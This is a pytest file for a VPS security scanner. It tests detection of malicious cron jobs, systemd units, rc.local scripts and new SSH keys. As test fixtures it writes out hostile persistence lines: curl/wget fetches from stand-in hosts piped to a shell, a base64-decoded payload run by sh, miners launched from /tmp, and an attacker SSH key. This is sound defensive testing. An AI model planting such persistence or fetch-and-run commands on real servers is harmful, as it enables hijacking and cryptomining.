#!/usr/bin/env python3
"""
VPS Guardian - Persistence Mechanism Detection Tests
Tests detection of cron jobs, systemd services, RC scripts, and SSH keys.
"""

import pytest
import json
import tempfile
from pathlib import Path
from guardian.modules.persistence import (
    PersistenceScanner,
    PersistenceThreat,
    PersistenceType
)


class TestPersistenceScanner:
    """Test suite for the PersistenceScanner module."""

    @pytest.fixture
    def persistence_config(self, tmp_path):
        """Persistence scanner configuration with temp paths."""
        return {
            'persistence': {
                'enabled': True,
                'crontab': {
                    'system_paths': [str(tmp_path / 'etc' / 'crontab')],
                    'cron_d_path': str(tmp_path / 'etc' / 'cron.d'),
                    'user_crontabs_path': str(tmp_path / 'var' / 'spool' / 'cron' / 'crontabs'),
                    'periodic_paths': [
                        str(tmp_path / 'etc' / 'cron.daily'),
                        str(tmp_path / 'etc' / 'cron.hourly')
                    ]
                },
                'systemd': {
                    'service_path': str(tmp_path / 'etc' / 'systemd' / 'system'),
                    'timer_path': str(tmp_path / 'etc' / 'systemd' / 'system')
                },
                'rc_scripts': {
                    'paths': [
                        str(tmp_path / 'etc' / 'rc.local'),
                        str(tmp_path / 'etc' / 'init.d')
                    ]
                },
                'ssh_keys': {
                    'authorized_keys_paths': [
                        str(tmp_path / 'root' / '.ssh' / 'authorized_keys'),
                        str(tmp_path / 'home' / '*' / '.ssh' / 'authorized_keys')
                    ],
                    'known_keys_db': str(tmp_path / 'var' / 'lib' / 'guardian' / 'known_ssh_keys.json')
                }
            }
        }

    def test_detect_malicious_crontab_wget_pipe_sh(self, persistence_config, tmp_path):
        """Should detect crontab with wget | sh pattern."""
        # Create crontab file
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text(
            "*/5 * * * * root wget http://malicious.com/miner.sh | sh\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        assert len(threats) >= 1
        found = [t for t in threats if t.type == PersistenceType.CRONTAB and 'wget' in t.content_snippet]
        assert len(found) == 1
        assert found[0].severity == 'high'
        assert 'wget' in found[0].matched_pattern or 'sh' in found[0].matched_pattern

    def test_detect_malicious_crontab_curl_pipe_bash(self, persistence_config, tmp_path):
        """Should detect crontab with curl | bash pattern."""
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text(
            "0 * * * * curl -s http://evil.com/script | bash\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if t.type == PersistenceType.CRONTAB]
        assert len(found) >= 1
        assert found[0].severity == 'high'

    def test_detect_tmp_execution_in_cron(self, persistence_config, tmp_path):
        """Should detect crontab executing from /tmp."""
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text(
            "*/10 * * * * /tmp/miner --quiet\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if '/tmp' in t.content_snippet]
        assert len(found) >= 1
        assert found[0].severity == 'high'

    def test_detect_base64_obfuscation_in_cron(self, persistence_config, tmp_path):
        """Should detect base64 decode patterns (obfuscation)."""
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text(
            "*/5 * * * * echo 'ZWNobyAibWFsaWNpb3VzIgo=' | base64 -d | sh\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if 'base64' in t.content_snippet]
        assert len(found) >= 1

    def test_scan_cron_d_directory(self, persistence_config, tmp_path):
        """Should scan /etc/cron.d/* files."""
        cron_d = tmp_path / 'etc' / 'cron.d'
        cron_d.mkdir(parents=True, exist_ok=True)
        malicious_cron = cron_d / 'malware'
        malicious_cron.write_text(
            "*/1 * * * * root /dev/shm/xmrig\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if '/dev/shm' in t.content_snippet]
        assert len(found) >= 1

    def test_scan_user_crontabs(self, persistence_config, tmp_path):
        """Should scan user crontabs in /var/spool/cron/crontabs/*."""
        user_crontabs = tmp_path / 'var' / 'spool' / 'cron' / 'crontabs'
        user_crontabs.mkdir(parents=True, exist_ok=True)
        user_cron = user_crontabs / 'www-data'
        user_cron.write_text(
            "@reboot nohup /var/tmp/bot &\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if 'nohup' in t.content_snippet or '/var/tmp' in t.content_snippet]
        assert len(found) >= 1

    def test_detect_malicious_systemd_service(self, persistence_config, tmp_path):
        """Should detect malicious systemd service by name."""
        systemd_path = tmp_path / 'etc' / 'systemd' / 'system'
        systemd_path.mkdir(parents=True, exist_ok=True)
        malicious_service = systemd_path / 'kinsing.service'
        malicious_service.write_text(
            "[Unit]\nDescription=System Service\n\n"
            "[Service]\nExecStart=/tmp/kinsing\n\n"
            "[Install]\nWantedBy=multi-user.target\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if t.type == PersistenceType.SYSTEMD_SERVICE and 'kinsing' in t.path]
        assert len(found) == 1
        assert found[0].severity == 'high'

    def test_detect_systemd_service_with_suspicious_execstart(self, persistence_config, tmp_path):
        """Should detect systemd service executing from /tmp."""
        systemd_path = tmp_path / 'etc' / 'systemd' / 'system'
        systemd_path.mkdir(parents=True, exist_ok=True)
        suspicious_service = systemd_path / 'cleanup.service'
        suspicious_service.write_text(
            "[Service]\nExecStart=/tmp/cleanup.sh\nRestart=always\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if t.type == PersistenceType.SYSTEMD_SERVICE and '/tmp' in t.content_snippet]
        assert len(found) >= 1

    def test_detect_systemd_timer(self, persistence_config, tmp_path):
        """Should detect systemd timers."""
        systemd_path = tmp_path / 'etc' / 'systemd' / 'system'
        systemd_path.mkdir(parents=True, exist_ok=True)
        timer_file = systemd_path / 'malware.timer'
        timer_file.write_text(
            "[Timer]\nOnCalendar=*:0/10\nUnit=malware.service\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if t.type == PersistenceType.SYSTEMD_TIMER]
        assert len(found) >= 1

    def test_detect_rc_local_with_suspicious_content(self, persistence_config, tmp_path):
        """Should detect suspicious content in /etc/rc.local."""
        rc_local = tmp_path / 'etc' / 'rc.local'
        rc_local.parent.mkdir(parents=True, exist_ok=True)
        rc_local.write_text(
            "#!/bin/bash\nwget http://evil.com/bot | sh\nexit 0\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if t.type == PersistenceType.RC_SCRIPT and 'wget' in t.content_snippet]
        assert len(found) >= 1

    def test_detect_new_ssh_key(self, persistence_config, tmp_path):
        """Should detect newly added SSH key."""
        # First run - baseline
        ssh_dir = tmp_path / 'root' / '.ssh'
        ssh_dir.mkdir(parents=True, exist_ok=True)
        authorized_keys = ssh_dir / 'authorized_keys'
        authorized_keys.write_text(
            "ssh-rsa AAAAB3NzaC1... legitimate@user\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats1 = scanner.scan()
        # First run should not flag existing keys (baseline)
        ssh_threats1 = [t for t in threats1 if t.type == PersistenceType.SSH_KEY]
        # On first run, keys are baselined, so no threats
        # (Implementation detail: baseline happens on first scan)

        # Add new key
        authorized_keys.write_text(
            "ssh-rsa AAAAB3NzaC1... legitimate@user\n"
            "ssh-rsa AAAAB3NzaC2... attacker@malicious\n"
        )

        threats2 = scanner.scan()
        ssh_threats2 = [t for t in threats2 if t.type == PersistenceType.SSH_KEY]

        # Second scan should detect the new key
        assert len(ssh_threats2) >= 1
        found_new = [t for t in ssh_threats2 if 'attacker@malicious' in t.content_snippet or 'AAAAB3NzaC2' in t.content_snippet]
        assert len(found_new) >= 1

    def test_not_detect_legitimate_cron(self, persistence_config, tmp_path):
        """Should NOT flag legitimate cron jobs."""
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text(
            "# System crontab\n"
            "0 5 * * * root /usr/bin/apt update\n"
            "15 3 * * * root /usr/bin/backup.sh\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        # Should be empty or not contain these legitimate entries
        cron_threats = [t for t in threats if t.type == PersistenceType.CRONTAB]
        suspicious_found = [t for t in cron_threats if 'apt' in t.content_snippet or 'backup.sh' in t.content_snippet]
        assert len(suspicious_found) == 0

    def test_not_detect_legitimate_systemd_service(self, persistence_config, tmp_path):
        """Should NOT flag legitimate systemd services."""
        systemd_path = tmp_path / 'etc' / 'systemd' / 'system'
        systemd_path.mkdir(parents=True, exist_ok=True)
        legit_service = systemd_path / 'nginx.service'
        legit_service.write_text(
            "[Service]\nExecStart=/usr/sbin/nginx\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if 'nginx.service' in t.path]
        assert len(found) == 0

    def test_scan_periodic_cron_directories(self, persistence_config, tmp_path):
        """Should scan cron.daily, cron.hourly, etc."""
        daily = tmp_path / 'etc' / 'cron.daily'
        daily.mkdir(parents=True, exist_ok=True)
        malicious_daily = daily / 'update'
        malicious_daily.write_text(
            "#!/bin/bash\ncurl http://malware.com/payload | sh\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        found = [t for t in threats if 'cron.daily' in t.path or 'curl' in t.content_snippet]
        assert len(found) >= 1

    def test_handle_missing_directories_gracefully(self, persistence_config):
        """Should handle missing directories without crashing."""
        # Config points to nonexistent paths
        scanner = PersistenceScanner(persistence_config)

        # Should not crash
        threats = scanner.scan()

        assert isinstance(threats, list)

    def test_disabled_scanner(self, persistence_config):
        """Should return empty list when persistence scanning is disabled."""
        persistence_config['persistence']['enabled'] = False

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        assert threats == []

    def test_threat_metadata_completeness(self, persistence_config, tmp_path):
        """Should provide complete metadata in threat objects."""
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text(
            "*/5 * * * * wget http://evil.com | sh\n"
        )

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        assert len(threats) >= 1
        threat = threats[0]

        # Check all required fields
        assert threat.type is not None
        assert threat.path is not None
        assert threat.content_snippet is not None
        assert threat.severity in ['high', 'medium', 'low']
        assert isinstance(threat.details, dict)

    def test_content_snippet_length_limit(self, persistence_config, tmp_path):
        """Should limit content snippet to prevent memory bloat."""
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        # Very long malicious line
        long_content = "*/5 * * * * wget http://evil.com/script.sh | sh" + " # " + "A" * 500
        crontab_file.write_text(long_content)

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        assert len(threats) >= 1
        # Content snippet should be limited (e.g., 200 chars)
        assert len(threats[0].content_snippet) <= 300

    def test_multiple_persistence_types_in_one_scan(self, persistence_config, tmp_path):
        """Should detect multiple types of persistence in a single scan."""
        # Create crontab
        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text("*/5 * * * * /tmp/miner\n")

        # Create systemd service
        systemd_path = tmp_path / 'etc' / 'systemd' / 'system'
        systemd_path.mkdir(parents=True, exist_ok=True)
        (systemd_path / 'bot.service').write_text("[Service]\nExecStart=/tmp/bot\n")

        # Create rc.local
        rc_local = tmp_path / 'etc' / 'rc.local'
        rc_local.parent.mkdir(parents=True, exist_ok=True)
        rc_local.write_text("#!/bin/bash\nwget http://evil.com | sh\n")

        scanner = PersistenceScanner(persistence_config)
        threats = scanner.scan()

        # Should find at least 3 threats (one of each type)
        assert len(threats) >= 3

        types_found = {t.type for t in threats}
        assert PersistenceType.CRONTAB in types_found
        assert PersistenceType.SYSTEMD_SERVICE in types_found
        assert PersistenceType.RC_SCRIPT in types_found
